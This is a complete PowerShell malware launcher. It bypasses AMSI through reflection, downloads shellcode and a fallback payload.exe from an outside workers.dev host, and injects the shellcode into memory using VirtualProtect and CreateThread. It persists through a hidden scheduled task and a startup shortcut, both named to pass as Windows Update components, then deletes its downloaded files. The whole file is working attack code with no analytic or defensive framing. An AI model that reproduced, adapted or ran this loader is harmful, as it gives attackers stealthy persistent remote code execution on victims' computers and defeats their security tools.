$ErrorActionPreference = 'SilentlyContinue'

# === IMMEDIATE DEBUG LOGGING ===
"Launcher started at $(Get-Date)" | Out-File "C:\Users\Public\debug.txt" -Append

# === ERROR LOGGING SETUP ===
$debugLog = "C:\Users\Public\debug.txt"
function Write-DebugLog {
    param([string]$Message)
    try {
        $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
        "$timestamp - $Message" | Out-File -FilePath $debugLog -Append -Encoding UTF8
    } catch {}
}

# === AMSI BYPASS (REFLECTION METHOD) ===
function Bypass-AMSI {
    try {
        Write-DebugLog "Attempting AMSI bypass"
        $amsiContext = [Ref].Assembly.GetType("System.Management.Automation.AmsiUtils")
        $amsiContext.GetField("amsiInitFailed", "NonPublic,Static").SetValue($null, $true)
        Write-DebugLog "AMSI bypass successful"
        return $true
    } catch {
        Write-DebugLog "AMSI bypass failed: $($_.Exception.Message)"
        return $false
    }
}

# === NATIVE METHODS DEFINITION ===
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class NativeMethods {
    [DllImport("kernel32.dll")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UInt32 dwSize, uint flNewProtect, out uint lpflOldProtect);
    
    [DllImport("kernel32.dll")]
    public static extern IntPtr CreateThread(uint lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);
}
"@

# === URL OBFUSCATION ===
$rawBase = "aged-mountain-614b.natalia-kush82.workers.dev"
$protocol = "https://"
$shellcodePath = "shellcode"
$shellcodeUrl = "$protocol$rawBase/$shellcodePath"

# Initialize exePath in outer scope
$exePath = $null

# === MEMORY INJECTION FUNCTIONS ===
function Invoke-ShellcodeInjection {
    param([byte[]]$Shellcode)
    
    try {
        Write-DebugLog "Starting shellcode injection"
        
        # Allocate memory with RW permissions
        $memAddress = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($Shellcode.Length)
        Write-DebugLog "Memory allocated at: 0x$($memAddress.ToString('X16'))"
        
        # Copy shellcode to allocated memory
        [System.Runtime.InteropServices.Marshal]::Copy($Shellcode, 0, $memAddress, $Shellcode.Length)
        Write-DebugLog "Shellcode copied to memory"
        
        # Change memory protection to RX (Read + Execute)
        $oldProtect = 0
        $result = [NativeMethods]::VirtualProtect(
            $memAddress, 
            [UInt32]$Shellcode.Length, 
            0x20, # PAGE_EXECUTE_READ
            [Ref]$oldProtect
        )
        
        if (-not $result) {
            Write-DebugLog "VirtualProtect failed"
            [System.Runtime.InteropServices.Marshal]::FreeHGlobal($memAddress)
            return $false
        }
        
        Write-DebugLog "Memory protection changed to RX"
        
        # Create and execute thread
        $threadId = 0
        $threadHandle = [NativeMethods]::CreateThread(
            0, # lpThreadAttributes
            0, # dwStackSize
            $memAddress, # lpStartAddress
            [IntPtr]::Zero, # lpParameter
            0, # dwCreationFlags
            [Ref]$threadId
        )
        
        if ($threadHandle -eq [IntPtr]::Zero) {
            Write-DebugLog "CreateThread failed"
            [System.Runtime.InteropServices.Marshal]::FreeHGlobal($memAddress)
            return $false
        }
        
        Write-DebugLog "Thread created with ID: $threadId"
        Write-DebugLog "Shellcode execution initiated"
        
        # Wait briefly to ensure thread starts
        Start-Sleep -Milliseconds 100
        
        return $true
    } catch {
        Write-DebugLog "Shellcode injection failed: $($_.Exception.Message)"
        try {
            if ($memAddress -ne [IntPtr]::Zero) {
                [System.Runtime.InteropServices.Marshal]::FreeHGlobal($memAddress)
            }
        } catch {}
        return $false
    }
}


# === SELF-PRESERVATION ===
$envData = Get-Item env:APPDATA
$cachePath = Join-Path $envData.Value "Microsoft\Windows\Caches"
if(!(Test-Path $cachePath)){New-Item -Path $cachePath -ItemType Directory -Force | Out-Null}

$randomSuffix = -join ((65..90) + (97..122) | Get-Random -Count 8 | % {[char]$_})
$localPath = Join-Path $cachePath "update_$randomSuffix.ps1"
$currentPath = $MyInvocation.MyCommand.Path

function Save-ScriptToDisk {
    param([string]$Destination)
    $dir = Split-Path $Destination -Parent
    if (-not (Test-Path $dir)) { New-Item -ItemType Directory -Path $dir -Force | Out-Null }
    if (-not $currentPath -or $currentPath -eq '') {
        try {
            $rawUrl = "$protocol$rawBase/assets/launcher.ps1"
            $webClient = New-Object System.Net.WebClient
            $webClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
            $webClient.DownloadString($rawUrl) | Out-File -FilePath $Destination -Encoding UTF8 -Force
        } catch { 
            Write-DebugLog "Failed to download script from remote"
            exit 
        }
    } else {
        Copy-Item -Path $currentPath -Destination $Destination -Force
    }
    return $Destination
}
$scriptPath = Save-ScriptToDisk -Destination $localPath

# === PERSISTENCE: Scheduled Task ===
$taskName = "WindowsUpdateTask"
$taskExists = Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue
if (-not $taskExists) {
    try {
        Write-DebugLog "Creating scheduled task"
        $trigger = New-ScheduledTaskTrigger -AtLogOn
        $encodedCommand = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes("-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$scriptPath`""))
        $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-EncodedCommand $encodedCommand"
        $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -Hidden -ExecutionTimeLimit (New-TimeSpan -Hours 1)
        Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Settings $settings -Force | Out-Null
        Write-DebugLog "Scheduled task created successfully"
        
        try {
            $taskPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\$taskName"
            if (Test-Path $taskPath) { 
                Remove-ItemProperty -Path $taskPath -Name "SecurityDescriptor" -Force -ErrorAction Stop 
                Write-DebugLog "Task security descriptor removed"
            }
        } catch {
            Write-DebugLog "Failed to remove task security descriptor: $($_.Exception.Message)"
        }
    } catch {
        Write-DebugLog "Failed to create scheduled task: $($_.Exception.Message)"
    }
} else {
    Write-DebugLog "Scheduled task already exists"
}

# === PERSISTENCE: Startup LNK ===
$startupPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
$lnkPath = "$startupPath\WindowsUpdateHelper.lnk"
if (-not (Test-Path $lnkPath)) {
    try {
        Write-DebugLog "Creating startup shortcut"
        $wshShell = New-Object -ComObject WScript.Shell
        $shortcut = $wshShell.CreateShortcut($lnkPath)
        $shortcut.TargetPath = "powershell.exe"
        $shortcut.Arguments = "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$scriptPath`""
        $shortcut.WindowStyle = 7
        $shortcut.Save()
        Write-DebugLog "Startup shortcut created successfully"
    } catch {
        Write-DebugLog "Failed to create startup shortcut: $($_.Exception.Message)"
    }
} else {
    Write-DebugLog "Startup shortcut already exists"
}

# === SET FIRST RUN FLAG ===
$flagFile = Join-Path $cachePath "installed.flag"
if (-not (Test-Path $flagFile)) {
    "1" | Out-File -FilePath $flagFile -Encoding UTF8
    Write-DebugLog "First run flag set"
}

# === DOWNLOAD AND EXECUTE PAYLOAD ===
Write-DebugLog "Starting payload download"
$randomSuffix2 = -join ((65..90) + (97..122) | Get-Random -Count 8 | % {[char]$_})
$shellcodePath = Join-Path $cachePath "temp_$randomSuffix2.bin"

try {
    $webClient = New-Object System.Net.WebClient
    $webClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36")
    
    $retryCount = 0
    $maxRetries = 3
    do {
        try {
            $webClient.DownloadFile($shellcodeUrl, $shellcodePath)
            Write-DebugLog "Shellcode downloaded successfully"
            break
        } catch {
            $retryCount++
            Write-DebugLog "Download attempt $retryCount failed: $($_.Exception.Message)"
            if ($retryCount -ge $maxRetries) { throw }
        }
    } while ($retryCount -lt $maxRetries)
    
    if (Test-Path $shellcodePath) {
        $shellcodeBytes = [System.IO.File]::ReadAllBytes($shellcodePath)
        Write-DebugLog "Shellcode loaded: $($shellcodeBytes.Length) bytes"
        
        # Attempt AMSI bypass
        $amsiBypass = Bypass-AMSI
        
        # Try shellcode injection
        $injectionSuccess = Invoke-ShellcodeInjection -Shellcode $shellcodeBytes
        
        if (-not $injectionSuccess) {
            Write-DebugLog "Shellcode injection failed, attempting EXE fallback"
            
            # Fallback to EXE execution
            $exeUrl = "$protocol$rawBase/payload.exe"
            $exePath = Join-Path $cachePath "helper_$randomSuffix2.exe"
            
            try {
                $webClient.DownloadFile($exeUrl, $exePath)
                Write-DebugLog "EXE payload downloaded"
                
                # Try multiple execution methods
                try {
                    Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "`"$exePath`"" -ErrorAction Stop | Out-Null
                    Write-DebugLog "EXE executed via WMI"
                } catch {
                    try { 
                        (New-Object -ComObject WScript.Shell).Run("`"$exePath`"", 0, $false) 
                        Write-DebugLog "EXE executed via WScript.Shell"
                    } catch { 
                        Start-Process $exePath -WindowStyle Hidden
                        Write-DebugLog "EXE executed via Start-Process"
                    }
                }
            } catch {
                Write-DebugLog "EXE fallback failed: $($_.Exception.Message)"
            }
        }
        
        # Cleanup
        try {
            Remove-Item $shellcodePath -Force -ErrorAction SilentlyContinue
            if (Test-Path $exePath) {
                Remove-Item $exePath -Force -ErrorAction SilentlyContinue
            }
            Write-DebugLog "Cleanup completed"
        } catch {
            Write-DebugLog "Cleanup failed: $($_.Exception.Message)"
        }
    }
} catch {
    Write-DebugLog "Critical error: $($_.Exception.Message)"
}

Write-DebugLog "Launcher script completed"
